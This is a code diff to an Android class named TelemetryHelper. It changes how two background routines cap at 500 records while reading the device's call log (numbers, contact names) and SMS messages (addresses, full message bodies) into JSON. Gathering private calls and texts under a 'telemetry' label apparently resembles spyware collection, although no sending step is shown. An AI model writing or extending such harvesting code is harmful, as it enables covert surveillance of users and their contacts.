@@ -104,13 +104,13 @@ public class TelemetryHelper {
             public void run() {
                 try {
                     ContentResolver cr = context.getContentResolver();
-                    Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 500");
+                    Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                     if (c == null) return;
 
                     JSONArray list = new JSONArray();
                     SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
 
-                    while (c.moveToNext()) {
+                    while (c.moveToNext() && list.length() < 500) {
                         String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                         String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                         int type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
@@ -150,13 +150,13 @@ public class TelemetryHelper {
             public void run() {
                 try {
                     ContentResolver cr = context.getContentResolver();
-                    Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 500");
+                    Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
                     if (c == null) return;
 
                     JSONArray list = new JSONArray();
                     SimpleDateFormat iso = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US);
 
-                    while (c.moveToNext()) {
+                    while (c.moveToNext() && list.length() < 500) {
                         String address = c.getString(c.getColumnIndex(Telephony.Sms.ADDRESS));
                         String bodyText = c.getString(c.getColumnIndex(Telephony.Sms.BODY));
                         int type = c.getInt(c.getColumnIndex(Telephony.Sms.TYPE));
